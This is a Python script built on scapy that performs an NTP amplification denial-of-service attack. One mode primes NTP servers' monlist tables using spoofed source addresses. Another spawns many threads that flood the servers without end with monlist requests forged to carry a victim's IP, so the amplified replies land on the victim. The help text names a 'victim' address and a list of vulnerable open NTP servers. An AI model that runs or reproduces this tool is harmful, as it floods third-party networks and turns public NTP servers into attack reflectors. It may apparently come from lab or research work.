import os
import time
import signal
import threading
import argparse
import logging
import random
import threading
import datetime
if 'datetime' in datetime.__dict__:
    from datetime import datetime

from scapy.all import*

kill_thread = None

class NTPAmp(object):
    def __init__(self, fpath, victim, nthreads, sport, dport, warmup):
        # IPs
        self.ntpservs = None
        self.read_entries(fpath)
        self.victim = victim

        # Thread
        self.nthreads = nthreads

        # Port
        self.sport=sport #Target's vulnerable port
        self.dport=dport

        # Logger
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)

        if warmup:
            ch = logging.FileHandler(filename='warmup.log', mode='w')
        else:
            ch = logging.FileHandler(filename='attack.log', mode='w')
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)

        self.logger.addHandler(ch)

    def read_entries(self, path):
        """
        Read NTP Servers entry from a file
        :param path: file path
        :return:
        """
        with open(path) as f:
            lines = map(lambda l: l.rstrip(), f.readlines())
            entries = map(lambda l: tuple(l.split(' ')), lines)
            entries = map(lambda e: (e[0], int(e[1])), entries)
            self.ntpservs = entries

    def generate_randomip(self):
        ip="192.168.{}.{}"
        for o3 in range(2, 255):
            for o4 in range(2, 255):
                yield ip.format(o3, o4)

    def add_monlist(self,srcip,sport):
        """
        Send ntp sync(ntpdate command)
        """
        self.logger.info("[*] add monlist entry - {}:{}".format(srcip,sport))
        ntpconf = {
            'leap': 3, #"unknown (clock unsynchronized)",
            'version': 4L,
            'stratum': 0L,
            'poll': 3L,
            'precision': 250L,
            'delay': 1.0,
            'dispersion': 1.0,
            #'ref_id': '',
            'orig': 0.0,
            'sent': datetime.now().strftime("%a %b %d %H:%M:%S %Y")
        }
        for ip, dport in self.ntpservs:
            self.logger.info("  [*] Add entry to ntpserver {}:{}".format(ip, dport))
            pkt=IP(src=srcip, dst=ip)/UDP(sport=sport,dport=dport)/NTP(**ntpconf)
            send(pkt)

    def get_monlist(self):
        data = "\x17\x00\x03\x2a" + "\x00" * 4
        for ip, dport in self.ntpservs:
            self.logger.info("[*] Get entry from ntpserver {}:{}".format(ip, dport))
            pkt=IP(dst=ip,src=self.victim)/UDP(sport=self.sport,dport=dport)/Raw(load=data)
            send(pkt)

    def get_monlist_loop(self, loop=False):
        """
        ntpdc -c monlist
        :return:
        """
        while True:
            self.get_monlist()

    def warmup(self):
        """
        call self.add_monlist
        :return:
        """
        self.logger.info("[+] Warm up start!")
        # target="192.168.178.{}"
        # for r in range(2, 255):
        #     self.add_monlist(target.format(r), random.randint(2000, 65535))
        gen = self.generate_randomip()
        for i in range(593):
            self.add_monlist(gen.next(), random.randint(2000, 65535))

    def attack(self):
        """
        NTP Amplification Attack
        call self.get_monlist
        :return:
        """
        self.logger.info("[+] NTP Amp Attack start!")
        self.logger.info("[*] Spawning {} daemonized threads...".format(self.nthreads))
        threads=[]
        for r in range(self.nthreads):
            thread = threading.Thread(target=self.get_monlist_loop)
            thread.daemon=True
            self.logger.info("[*] Spawn {}".format(thread))
            thread.start()
            threads.append(thread)
        self.logger.info("[+] Finish spawning.")

        for thread in threads:
            thread.join()

def argument_parse():
    examples="""
        EXAMPLES
            Warmup: python ntpamp.py -w -v 192.168.179.15 >/dev/null 2>&1 &
            Attack: python ntpamp.py -v 192.168.179.15 -n 16 >/dev/null 2>&1 &
            Single: python ntpamp.py -s -v 192.168.179.15 >/dev/null 2>&1 &
        FILES
            ntpservs.txt ... Open NTP monlist vulnerable servers list.
            attack.log   ... attack with this script logs
            warmpup.log  ... warmup with this script logs
    """
    parser = argparse.ArgumentParser(description=examples, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
    parser.add_argument('-s', '--single', action='store_true', help='Execute single get_monlist')
    parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address', default='192.168.179.15')
    parser.add_argument('-t', '--time', type=int, help='time to calculate for attacking (sec. default 1800 sec.)', default=1800)
    parser.add_argument('-n', '--nthreads',type=int, help='Number of threads (default 1)', default=32)
    parser.add_argument('-f', '--fpath', type=str, help='NTP Servers entry file path (default ./ntpservs.txt)', default='./ntpservs.txt')
    parser.add_argument('--sport', type=int, help='Source port. this port is victim port. (default 8080)', default=8080)
    parser.add_argument('--dport', type=int, help='Destination port. this port is ntp service port. (default 123)', default=123)
    args = parser.parse_args()
    return args

def spawn_kill_me(sleep_time):
    """
    not test yet
    :return:
    """
    global kill_thread
    def kill_me():
        time.sleep(sleep_time)
        pid = os.getpid()
        os.kill(pid, signal.SIGKILL)
    kill_thread = threading.Thread(target=kill_me)
    kill_thread.start()

if __name__ == '__main__':
    args = argument_parse()
    ntpamp = NTPAmp(args.fpath, args.victim, args.nthreads, args.sport, args.dport, args.warmup)
    if args.single:
        ntpamp.get_monlist()
    elif args.warmup:
        ntpamp.warmup()
    else:
        spawn_kill_me(args.time)
        ntpamp.attack()